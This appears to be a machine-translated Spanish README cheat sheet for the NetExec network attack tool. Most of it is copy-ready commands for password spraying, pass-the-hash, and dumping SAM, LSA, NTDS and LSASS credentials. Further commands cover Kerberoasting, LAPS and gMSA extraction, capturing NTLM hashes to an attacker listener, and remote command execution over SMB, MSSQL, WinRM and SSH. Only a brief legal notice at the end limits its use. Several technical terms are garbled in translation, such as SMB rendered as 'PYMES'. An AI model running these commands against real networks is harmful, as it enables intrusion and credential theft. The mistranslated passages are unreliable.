<!-- language-home-navigation -->
[🏠 Página Principal Española](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇫🇷 Français](README.fr.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# ⚡ NetExec (nxc) - Hoja de referencia completa

[🇹🇷 Türkçe Sürüm](traducciones/README.tr.md)
```
  ███╗   ██╗███████╗████████╗███████╗██╗  ██╗███████╗ ██████╗ 
  ████╗  ██║██╔════╝╚══██╔══╝██╔════╝╚██╗██╔╝██╔════╝██╔════╝ 
  ██╔██╗ ██║█████╗     ██║   █████╗   ╚███╔╝ █████╗  ██║     
  ██║╚██╗██║██╔══╝     ██║   ██╔══╝   ██╔██╗ ██╔══╝  ██║     
  ██║ ╚████║███████╗   ██║   ███████╗██╔╝ ██╗███████╗╚██████╗ 
  ╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝ 
        The Network Swiss Army Knife (CrackMapExec Successor)
```
<p align="centro">
  <img src="https://img.shields.io/badge/NetExec-nxc-blue?style=for-the-badge" alt="NetExec">
  <img src="https://img.shields.io/badge/CME_Successor-Active_Development-green?style=for-the-badge" alt="CME Sucesor">
  <img src="https://img.shields.io/badge/Multi_Protocol-SMB_LDAP_MSSQL-orange?style=for-the-badge" alt="Multiprotocolo">
  <img src="https://img.shields.io/badge/Network-Pentesting-red?style=for-the-badge" alt="Pentesting de red">
</p>

<p align="centro">
  <b>🌐 El sucesor oficial impulsado por la comunidad de CrackMapExec para la explotación de redes y Active Directory</b>
</p>

---

## 📋 Tabla de contenidos

- [Introducción](#-introducción)
- [¿Por qué NetExec en lugar de CrackMapExec?](#-why-netexec-over-crackmapexec)
- [Instalación](#-instalación)
- [Protocolos admitidos](#-protocolos-compatibles)
- [Explotación de PYMES](#-explotación-smb)
  - [Reconocimiento y enumeración de acciones] (#reconnaissance--share-enumeration)
  - [Rociación de contraseñas y prueba de credenciales](#rociación de contraseñas--prueba-de-credenciales)
  - [Pasar-el-hash (PtH) y Pase-el-boleto (PtT)](#pasar-el-hash-pth--pasar-el-boleto-ptt)
  - [Volcado de credenciales (SAM, LSA, NTDS)](#credential-dumping-sam-lsa-ntds)
  - [Ejecución de comando](#ejecución-comando)
- [Explotación LDAP](#-ldap-exploitation)
  - [Política de contraseñas y enumeración de dominios](#enumeración-dominio--política-de-contraseñas)
  - [AS-REP Tostado y Kerberoasting](#as-rep-tostado--kerberoasting)
  - [Extracción LAPS y gMSA] (#laps--gmsa-extracción)
  - [Ingestión de datos de BloodHound] (#ingestión-de-datos-bloodhound)
- [Explotación de MSSQL](#-explotación-mssql)
- [Módulos WinRM, RDP y SSH](#-winrm-rdp--ssh-modules)
- [Módulos NetExec populares (`-M`)](#-popular-netexec-modules--m)
- [Espacios de trabajo y base de datos integrada] (#-espacios de trabajo--base de datos integrada)
- [Tabla de referencia rápida](#-tabla-de-referencia-rápida)
- [Consejos y mejores prácticas](#-consejos--mejores-prácticas)
- [Aviso legal](#-aviso-legal)
- [Recursos](#-recursos)

---

## 🎯 Introducción

**NetExec** (`nxc`) es una herramienta de posexplotación multipropósito diseñada para automatizar la evaluación de grandes redes de Active Directory y Windows. Es la bifurcación oficial y activa de la comunidad y la continuación de **CrackMapExec** (CME), creada después de que CME fuera retirado y archivado por su autor original.

NetExec actúa como una "navaja suiza" de red, interactuando perfectamente con SMB, LDAP, MSSQL, WinRM, RDP, SSH, FTP y VNC para automatizar la autenticación, el volcado de credenciales, las comprobaciones de vulnerabilidad y el movimiento lateral.

---

## ⚖️ ¿Por qué NetExec en lugar de CrackMapExec?

| Característica | CrackMapExec (CME) | NetExec (nxc) |
|---------|--------------------|---------------|
| **Estado de desarrollo** | 🛑 Archivado / Obsoleto | 🟢 Mantenido activamente |
| **Soporte de Python** | Legado (Python 3.8-3.10) | Python moderno 3.10+ |
| **Soporte de protocolo** | SMB, LDAP, MSSQL, WinRM, SSH | + Mejoras en VNC, FTP, RDP y WMI |
| **Soporte de BloodHound** | Sólo BloodHound Legacy | BloodHound CE y legado |
| **Kerberos y PKINIT** | Limitado | Sólido soporte para tickets PKINIT y Kerberos |
| **Corrección de errores y módulos** | Congelado | CVE y módulos de explotación constantemente actualizados |

---

## 📥 Instalación

### Usando pipx (recomendado)
```bash
pipx install netexec
```
### Kali Linux

NetExec es el reemplazo oficial de CrackMapExec en Kali:
```bash
sudo apt update && sudo apt install -y netexec
```
### acoplador
```bash
docker run -it --rm -v ~/.nxc:/root/.nxc ghcr.io/penny-os/netexec:latest smb 10.10.10.0/24
```
### Verificación
```bash
nxc --version
```
---

## 🔌 Protocolos admitidos

NetExec acepta el protocolo de destino como argumento principal:
```bash
nxc <protocol> <target(s)> [options]
```
- `nxc smb` - Bloque de mensajes del servidor (compartidos, volcado de SAM/LSA/NTDS, comando ejecutivo)
- `nxc ldap` - Protocolo ligero de acceso a directorios (Kerberoasting, BloodHound, LAPS)
- `nxc mssql` - Microsoft SQL Server (consultas a bases de datos, xp_cmdshell, suplantación)
- `nxc winrm` - Gestión remota de Windows (ejecución oculta de comandos)
- `nxc rdp` - Protocolo de escritorio remoto (verificación de autenticación, capturas de pantalla)
- `nxc ssh` - Secure Shell (prueba y ejecución de credenciales Linux/UNIX)
- `nxc ftp` / `nxc vnc` - Transferencia de archivos y computación en red virtual

---

## 🛡️ Explotación de PYMES

### Reconocimiento y enumeración de acciones
```bash
# Discover live hosts and check SMB signing status
nxc smb 10.10.10.0/24

# Enumerate null/anonymous sessions
nxc smb 10.10.10.50 -u '' -p '' --shares
nxc smb 10.10.10.50 -u 'guest' -p '' --shares

# Enumerate readable shares with credentials
nxc smb 10.10.10.0/24 -u 'alice' -p 'Welcome2026!' --shares

# Spider shares for sensitive files (e.g., matching config, password, or bak)
nxc smb 10.10.10.50 -u 'alice' -p 'Welcome2026!' -M spider_plus
```
### Rociado de contraseñas y prueba de credenciales
```bash
# Check domain password policy before spraying (Prevents account lockouts!)
nxc smb 10.10.10.1 -u 'alice' -p 'Welcome2026!' --pass-pol

# Password spray a single password against a list of users
nxc smb 10.10.10.1 -u users.txt -p 'SeasonYear2026!' --continue-on-success

# Credential stuffing with user:pass pairs
nxc smb 10.10.10.1 -u users.txt -p passwords.txt --no-bruteforce
```
### Pasar el hash (PtH) y Pasar el billete (PtT)
```bash
# Authenticate using NTLM hash
nxc smb 10.10.10.0/24 -u 'Administrator' -H 'fc525c9680e4760a094da0c9ec5f0d94' --local-auth

# Authenticate using Kerberos ccache ticket
export KRB5CCNAME=/path/to/ticket.ccache
nxc smb dc01.corp.local -k --shares
```
### Volcado de credenciales (SAM, LSA, NTDS)
```bash
# Dump local SAM database (Requires administrative privileges)
nxc smb 10.10.10.50 -u 'Administrator' -H 'hash' --sam

# Dump LSA secrets (Service accounts, cleartext passwords)
nxc smb 10.10.10.50 -u 'Administrator' -H 'hash' --lsa

# Dump Active Directory NTDS.dit database via VSS on Domain Controller
nxc smb 10.10.10.1 -u 'Administrator' -p 'Password123' --ntds
```
### Ejecución de comandos
```bash
# Execute command via WMI (default)
nxc smb 10.10.10.50 -u 'Administrator' -p 'Pass123' -x 'whoami /all'

# Execute command via PowerShell
nxc smb 10.10.10.50 -u 'Administrator' -p 'Pass123' -X 'Get-Process'

# Execute command via SMBexec or atexec
nxc smb 10.10.10.50 -u 'Administrator' -p 'Pass123' --exec-method smbexec -x 'ipconfig'
```
---

## 🌳 Explotación LDAP

### Política de contraseñas y enumeración de dominios
```bash
# Dump domain users
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --users

# Dump domain groups and memberships
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --groups

# Check for active domain computers
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --computers
```
### AS-REP Tostado y Kerberoasting
```bash
# Identify and dump AS-REP Roastable accounts (DONT_REQ_PREAUTH)
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --asreproast asrep_hashes.txt

# Request Kerberos Service Tickets (Kerberoasting)
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --kerberoasting kerberoast_hashes.txt
```
### Extracción LAPS y gMSA
```bash
# Extract Microsoft LAPS (Local Administrator Password Solution) passwords
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' -M laps

# Dump Group Managed Service Account (gMSA) passwords
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' -M gmsa
```
### Ingestión de datos de BloodHound
```bash
# Collect BloodHound data natively over LDAP
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --bloodhound --collection All
```
---

## 🗄️ Explotación MSSQL
```bash
# Test MSSQL authentication across network
nxc mssql 10.10.10.0/24 -u 'sa' -p 'DatabasePassword!'

# Check for privilege escalation via server links
nxc mssql 10.10.10.75 -u 'sa' -p 'DatabasePassword!' -M enum_links

# Enable xp_cmdshell and execute operating system command
nxc mssql 10.10.10.75 -u 'sa' -p 'DatabasePassword!' -x 'whoami'

# Capture NetNTLMv2 hash by triggering xp_dirtree
nxc mssql 10.10.10.75 -u 'sa' -p 'DatabasePassword!' -M capture-ntlm -o IP=192.168.1.100
```
---

## 🚀 Módulos WinRM, RDP y SSH

### Ejecución del comando WinRM
```bash
nxc winrm 10.10.10.50 -u 'Administrator' -p 'Pass123' -x 'whoami'
```
### Captura de pantalla y autenticación de RDP
```bash
# Check RDP credentials and capture login screenshot
nxc rdp 10.10.10.50 -u 'Administrator' -p 'Pass123' --screenshot
```
### Pulverización y comandos SSH
```bash
nxc ssh 10.10.10.0/24 -u 'root' -p 'toor' -x 'id'
```
---

## 🧩 Módulos NetExec populares (`-M`)

| Módulo | Protocolo | Descripción | Ejemplo |
|--------|----------|-------------|---------|
| `spooler` | Pymes | Compruebe si el servicio Print Spooler se está ejecutando (PrinterBug) | `nxc smb <IP> -M spooler` |
| `zerologon` | Pymes | Verifique la vulnerabilidad CVE-2020-1472 | `nxc smb <IP> -M zerologon` |
| `nopac` | Pymes | Verifique CVE-2021-42278 / CVE-2021-42287 | `nxc smb <IP> -M nopac` |
| `petitpotam` | Pymes | Compruebe si el anfitrión es vulnerable a la coerción de PetitPotam | `nxc smb <IP> -M petitpotam` |
| `nanodump` | Pymes | Vuelque el minivolcado de memoria LSASS de forma sigilosa usando nanodump | `nxc smb <IP> -u admin -p pass -M nanodump` |
| `webdav` | Pymes | Compruebe si el servicio WebClient está activo para la retransmisión WebDAV | `nxc smb <IP> -M webdav` |
| `laps` | LDAP | Volcar contraseñas LAPS para estaciones de trabajo | `nxc ldap <IP> -u u -p p -M laps` |
| `gmsa` | LDAP | Extraer los secretos de la cuenta de servicio administrada del grupo | `nxc ldap <IP> -u u -p p -M gmsa` |

---

## 💾 Espacios de trabajo y base de datos integrada

NetExec registra automáticamente todos los hosts descubiertos, las credenciales válidas y los hashes volcados en una base de datos SQLite local (`~/.nxc/workspaces/`):
```bash
# View all stored credentials
nxc-database credentials

# View discovered hosts
nxc-database hosts

# Create and switch to a new client engagement workspace
nxc-database workspace create ClientAlpha
nxc-database workspace switch ClientAlpha
```
---

## 📊 Tabla de referencia rápida

| Tarea | Protocolo | Comando |
|------|----------|---------|
| **Enumerar acciones** | Pymes | `nxc smb <IP> -u '' -p '' --shares` |
| **Consultar política de pases** | Pymes | `nxc smb <DC> -u 'user' -p 'pass' --pass-pol` |
| **Aerosol de contraseña** | Pymes | `nxc smb <IP> -u users.txt -p 'Pass' --continue-on-success` |
| **Pase el hash** | Pymes | `nxc smb <IP> -u 'admin' -H <NT_HASH> --local-auth` |
| **Descargar SAM** | Pymes | `nxc smb <IP> -u 'admin' -H <HASH> --sam` |
| **Volcar NTDS** | Pymes | `nxc smb <DC> -u 'admin' -p 'pass' --ntds` |
| **Tueste AS-REP** | LDAP | `nxc ldap <DC> -u 'user' -p 'pass' --asreproast hashes.txt` |
| **Kerberoasting** | LDAP | `nxc ldap <DC> -u 'user' -p 'pass' --kerberoasting hashes.txt` |
| **Volcado de BloodHound** | LDAP | `nxc ldap <DC> -u 'user' -p 'pass' --bloodhound --collection All` |
| **MSSQL xp_cmdshell**| MSSQL | `nxc mssql <IP> -u 'sa' -p 'pass' -x 'whoami'` |

---

## 💡 Consejos y mejores prácticas

1. **Siempre verifique primero la política de contraseñas:**
   Antes de iniciar cualquier aplicación de contraseña, ejecute siempre `nxc smb <DC> -u <USER> -p <PASS> --pass-pol` para inspeccionar `Account Lockout Threshold`. Si está configurado en 3 o 5, rocíe solo una vez cada más de 30 minutos para evitar bloquear cuentas de dominio.
2. **Utilice `--local-auth` para estaciones de trabajo:**
   Al probar las credenciales de administrador local en estaciones de trabajo en lugar de las credenciales de dominio, incluya siempre el indicador `--local-auth`.
3. **Integración pivotante:**
   ¡NetExec funciona perfectamente a través de servidores proxy SOCKS (por ejemplo, `proxychains nxc smb ...`) o a través de interfaces Ligolo-ng TUN con velocidad nativa!

---

## ⚠️ Aviso legal

> **IMPORTANTE:** NetExec es una herramienta de evaluación de seguridad ofensiva. Debe usarse estrictamente en redes informáticas e infraestructura de dominio donde haya adquirido una autorización explícita y documentada.

---

## 📚 Recursos

- [Repositorio oficial de GitHub de NetExec](https://github.com/Pennyw0rth/NetExec)
- [Documentación oficial de NetExec](https://www.netexec.wiki/)